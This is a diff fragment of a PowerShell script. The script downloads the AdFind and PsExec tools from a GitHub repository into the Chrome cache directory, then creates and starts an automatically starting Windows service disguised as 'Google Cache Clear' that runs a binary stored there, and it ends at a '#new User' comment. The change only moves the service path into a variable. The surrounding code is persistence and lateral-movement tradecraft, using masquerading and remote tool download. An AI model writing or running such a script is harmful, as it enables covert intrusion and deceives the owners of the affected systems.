@@ -4,7 +4,8 @@ Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/AdFind.exe?raw=
 Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/PsExec.exe?raw=true" -OutFile "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache\PsExec.exe"
 
 #create service
-New-Service -Name "google_cache_clear" -DisplayName "Google Cache Clear" -Description "Service clears unused data from google chrome cache" -StartupType "Automatic" -BinaryPathName "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"
+$serviceBinary = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"
+New-Service -Name "google_cache_clear" -DisplayName "Google Cache Clear" -Description "Service clears unused data from google chrome cache" -StartupType "Automatic" -BinaryPathName $serviceBinary
 Start-Service -Name google_cache_clear
 
 #new User
